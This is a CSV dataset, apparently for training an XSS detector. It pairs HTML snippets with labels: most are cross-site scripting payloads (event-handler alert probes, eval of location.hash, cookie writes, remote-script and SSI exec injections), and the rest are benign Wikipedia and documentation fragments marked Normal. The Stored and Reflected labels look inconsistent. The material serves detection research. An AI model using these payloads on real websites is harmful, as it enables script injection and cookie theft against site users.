Sentence,Final_Label
"<svg onpaste=""alert(1)"" contenteditable>test</svg>",Stored XSS
<script>var x = document.URL; document.write(x);</script>,DOM-based XSS
"<big onmouseover=""alert(1)"">test</big>",Reflected XSS
"<dt><a class=""reference internal"" href=""topics/leaks.html""><span class=""doc"">Debugging memory leaks",Normal
"<script>setTimeout(function(){ document.write(location.hash); }, 1000);</script>",DOM-based XSS
"<li id=""cite_note-252""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-252"">^ </a> </b> ",Normal
"<multicol onmousemove=""alert(1)"">test</multicol>",Reflected XSS
"<object onkeypress=""alert(1)"" contenteditable>test</object>",Stored XSS
"<SCRIPT a="">"" '' SRC=""httx://.rocks/.js""></SCRIPT>",Stored XSS
<strike onpointerdown=alert(1)>XSS</strike>,Reflected XSS
<svg><table onload=alert(1)></table>,Stored XSS
<svg id=x tabindex=1 onbeforeactivate=alert(1)></svg>,Stored XSS
"<object data=""javascript:alert()"">",Stored XSS
"<template draggable=""true"" ondragend=""alert(1)"">test</template>",Reflected XSS
<svg><head onload=alert(1)></head>,Stored XSS
"<style>:target {color: red;}</style><iframe id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></iframe>",Stored XSS
	 </span>,Normal
"<b onmouseleave=""alert(1)"">test</b>",Reflected XSS
      <dl>,Normal
"<p class=""caption""><span class=""caption-text"">All the rest",Normal
"<style>@keyframes x{}</style><iframe style=""animation-name:x"" onanimationstart=""alert(1)""></iframe>",Stored XSS
"<applet onmouseenter=""alert(1)"">test</applet>",Reflected XSS
"<u oncontextmenu=""alert(1)"">test</u>",Reflected XSS
<script onreadystatechange=alert(1)></script>,Stored XSS
<script>var hash = location.hash; eval(hash.substring(1));</script>,DOM-based XSS
"<script>document.getElementById(""output"").innerHTML = location.hash.substring(1);</script>",DOM-based XSS
"<li id=""cite_note-54""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-54"">^ </a> </b> ",Normal
"	 <div style=""padding:0em 0.25em"">",Normal
"<output draggable=""true"" ondragenter=""alert(1)"">test</output>",Reflected XSS
<script>eval(document.location.hash.substring(1));</script>,DOM-based XSS
"<dt onmouseenter=""alert(1)"">test</dt>",Reflected XSS
"<address onmouseenter=""alert(1)"">test</address>",Reflected XSS
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=5"" title=""Edit section: Reasoning, problem solving"">edit </a><span class=""mw-editsection-bracket"">] ",Normal
"<iframe oncontextmenu=""alert(1)"">test</iframe>",Stored XSS
"<SPAN DATASRC=""#"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",Stored XSS
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:7.5em"">Contemporary </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;padding:0px"">",Normal
<script>var input = window.location.search; document.body.innerHTML = input;</script>,DOM-based XSS
<meta onpointerup=alert(1)>XSS</meta>,Reflected XSS
"<li><a href=""/wiki/Scientific_formalism"" title=""Scientific formalism"">Scientific formalism </a> </li>",Normal
"<style>@keyframes x{}</style><basefont style=""animation-name:x"" onanimationend=""alert(1)""></basefont>",Reflected XSS
"<embed draggable=""true"" ondragstart=""alert(1)"">test</embed>",Stored XSS
<em id=x tabindex=1 onfocusin=alert(1)></em>,Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><progress ondrop=alert(1) contenteditable>drop here</progress>",Reflected XSS
"<time oncontextmenu=""alert(1)"">test</time>",Reflected XSS
"<script>setInterval(function(){document.write(document.cookie);},2000);</script>",DOM-based XSS
<svg><details onload=alert(1)></details>,Stored XSS
<!DOCTYPE html>,Normal
<svg><discard onbegin=alert(1)>,Stored XSS
"<style>:target {color: red;}</style><ruby id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ruby>",Reflected XSS
<svg><bdi onload=alert(1)></bdi>,Stored XSS
"<footer onkeyup=""alert(1)"" contenteditable>test</footer>",Reflected XSS
<svg><button onload=alert(1)></button>,Stored XSS
"<script onmouseleave=""alert(1)"">test</script>",Stored XSS
"<p>The simplest AI applications can be divided into two types: classifiers (""if shiny then diamond"") and controllers (""if shiny then pick up""). Controllers do, however, also classify conditions before inferring actions, and therefore classification forms a central part of many AI systems. <a href=""/wiki/Classifier_(mathematics)"" class=""mw-redirect"" title=""Classifier (mathematics)"">Classifiers </a> are functions that use <a href=""/wiki/Pattern_matching"" title=""Pattern matching"">pattern matching </a> to determine a closest match. They can be tuned according to examples, making them very attractive for use in AI. These examples are known as observations or patterns. In supervised learning, each pattern belongs to a certain predefined class. A class can be seen as a decision that has to be made. All the observations combined with their class labels are known as a data set. When a new observation is received, that observation is classified based on previous experience.<sup id=""cite_ref-Classifiers_216-0"" class=""reference""><a href=""#cite_note-Classifiers-216"">&#91;210&#93; </a> </sup>",Normal
<param onpointerdown=alert(1)>XSS</param>,Reflected XSS
"<object onmousedown=""alert(1)"">test</object>",Stored XSS
<svg><font onload=alert(1)></font>,Stored XSS
"<button draggable=""true"" ondrag=""alert(1)"">test</button>",Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><optgroup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></optgroup>",Reflected XSS
"<bdo oncut=""alert(1)"" contenteditable>test</bdo>",Reflected XSS
"<ins onpaste=""alert(1)"" contenteditable>test</ins>",Reflected XSS
"<script onkeydown=""alert(1)"" contenteditable>test</script>",Stored XSS
"<div draggable=""true"" contenteditable>drag me</div><embed ondrop=alert(1) contenteditable>drop here</embed>",Stored XSS
"<embed onmouseleave=""alert(1)"">test</embed>",Stored XSS
"<th onpaste=""alert(1)"" contenteditable>test</th>",Reflected XSS
"<link draggable=""true"" ondragend=""alert(1)"">test</link>",Reflected XSS
"<nobr oncontextmenu=""alert(1)"">test</nobr>",Reflected XSS
"<form oncontextmenu=""alert(1)"">test</form>",Reflected XSS
"     <script type=""text/javascript"" id=""documentation_options"" data-url_root=""./"" src=""_static/documentation_options.js""></script>",Normal
<html id=x tabindex=1 onbeforeactivate=alert(1)></html>,Reflected XSS
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://.rocks/.js></SCRIPT>'""",Stored XSS
<svg><option onload=alert(1)></option>,Stored XSS
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Infosys&amp;rft.atitle=Role+of+AI+in+travel+and+Hospitality+Industry&amp;rft.date=2018&amp;rft_id=https%3A%2F%2Fwww.infosys.com%2Findustries%2Ftravel-hospitality%2Fdocuments%2Fai-travel-hospitality.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<meta id=x tabindex=1 ondeactivate=alert(1)></meta><input id=y autofocus>,Reflected XSS
"<dt><a class=""reference internal"" href=""topics/link-extractors.html""><span class=""doc"">Link Extractors",Normal
<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>,Reflected XSS
<details id=x tabindex=1 ondeactivate=alert(1)></details><input id=y autofocus>,Reflected XSS
<frame onpointerover=alert(1)>XSS</frame>,Reflected XSS
 ,Normal
"<script>var data = document.referrer; document.getElementById(""demo"").innerHTML=data;</script>",DOM-based XSS
"<dt onmouseout=""alert(1)"">test</dt>",Reflected XSS
	 </span></p>,Normal
"<svg draggable=""true"" ondragleave=""alert(1)"">test</svg>",Stored XSS
"<colgroup onkeydown=""alert(1)"" contenteditable>test</colgroup>",Reflected XSS
"<script oncut=""alert(1)"" contenteditable>test</script>",Stored XSS
"<script>var url = document.URL; document.getElementById(""test"").innerHTML=url;</script>",DOM-based XSS
"<output onmouseover=""alert(1)"">test</output>",Reflected XSS
"<style>:target {color:red;}</style><isindex id=x style=""transition:color 1s"" ontransitionend=alert(1)></isindex>",Reflected XSS
"<tbody onclick=""alert(1)"">test</tbody>",Reflected XSS
<object id=x tabindex=1 onbeforeactivate=alert(1)></object>,Stored XSS
"<style>@keyframes x{}</style><embed style=""animation-name:x"" onanimationstart=""alert(1)""></embed>",Stored XSS
"<label onmouseenter=""alert(1)"">test</label>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><svg ondrop=alert(1) contenteditable>drop here</svg>",Stored XSS
"<iframe onmouseleave=""alert(1)"">test</iframe>",Stored XSS
 </li>,Normal
<animate onpointerover=alert(1)>XSS</animate>,Reflected XSS
        ,Normal
<embed onpointermove=alert(1)>XSS</embed>,Stored XSS
"<object onbeforecut=""alert(1)"" contenteditable>test</object>",Stored XSS
"<multicol draggable=""true"" ondragstart=""alert(1)"">test</multicol>",Reflected XSS
<style onfocusout=alert(1) tabindex=1 id=x></style><input autofocus>,Reflected XSS
"<noframes draggable=""true"" ondrag=""alert(1)"">test</noframes>",Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><object id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></object>",Stored XSS
